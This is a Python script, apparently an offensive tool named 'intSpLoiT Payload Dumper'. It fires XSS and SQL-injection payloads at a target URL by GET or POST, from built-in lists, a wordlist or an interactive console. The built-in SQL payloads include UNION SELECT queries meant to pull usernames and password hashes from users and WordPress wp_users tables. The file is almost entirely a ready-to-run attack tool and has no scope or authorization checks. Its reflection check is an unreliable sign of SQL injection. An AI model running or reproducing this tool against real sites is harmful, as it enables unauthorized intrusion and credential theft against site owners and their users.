import argparse
import requests

PAYLOADS = {
    "XSS": [
        '<script>alert("XSS")</script>',
        '"><svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>'
    ],
    "SQL": [
        "' OR 1=1 --",
        "' UNION SELECT 1, user_login, user_pass FROM users --",
        "admin' OR '1'='1 --"
    ],
    "WP_SQL": [
        "' OR 1=1 --",
        "' UNION SELECT id, user_login, user_pass FROM wp_users --",
        "admin' OR '1'='1 --"
    ]
}

def run_payload(url, payload, method="GET", data=None):
    """Send HTTP request with payload."""
    try:
        if method.upper() == "GET":
            target_url = f"{url}{'&' if '?' in url else '?'}test={payload}"
            response = requests.get(target_url)
        else:
            payload_data = {k: v.replace("{payload}", payload) for k, v in data.items()}
            response = requests.post(url, data=payload_data)
        
        print(f"[*] Testing Payload: {payload}")
        print(f"[*] Response Code: {response.status_code}")
        if payload in response.text:
            print("[+] Possible vulnerability detected!")
        else:
            print("[-] No vulnerability found.")
    except Exception as e:
        print(f"[-] Error: {e}")

def console_mode(url, method="GET", data=None):
    """Interactive console mode."""
    print("[*] Entering interactive console mode. Type 'exit' to quit.")
    while True:
        user_payload = input("dumper > ")
        if user_payload.lower() == "exit":
            print("[*] Exiting console mode...")
            break
        run_payload(url, user_payload, method, data)

def test_wordlist(url, wordlist, method="GET", data=None):
    """Test payloads from a wordlist file."""
    try:
        with open(wordlist, "r", encoding="utf-8") as f:
            payloads = f.read().splitlines()
        
        print(f"[*] Loaded {len(payloads)} payloads from {wordlist}")
        
        for payload in payloads:
            run_payload(url, payload, method, data)
    except Exception as e:
        print(f"[-] Error loading wordlist: {e}")

def main():
    parser = argparse.ArgumentParser(description="intSpLoiT Payload Dumper")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--payload", help="Custom payload or predefined type (XSS, SQL, WP_SQL)")
    parser.add_argument("-w", "--wordlist", help="Path to a wordlist file")
    parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="HTTP method (default: GET)")
    parser.add_argument("--console", action="store_true", help="Enable interactive console mode")
    parser.add_argument("--data", help="POST data as key=value pairs, separate with '&'")

    args = parser.parse_args()
    data = None

    if args.data:
        try:
            data = dict(pair.split("=") for pair in args.data.split("&"))
        except:
            print("[-] Invalid data format! Use key=value&key2=value2")
            return

    if args.console:
        console_mode(args.url, args.method, data)
    elif args.wordlist:
        test_wordlist(args.url, args.wordlist, args.method, data)
    elif args.payload:
        if args.payload in PAYLOADS:
            print(f"[*] Using predefined {args.payload} payloads:")
            for payload in PAYLOADS[args.payload]:
                run_payload(args.url, payload, args.method, data)
        else:
            run_payload(args.url, args.payload, args.method, data)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()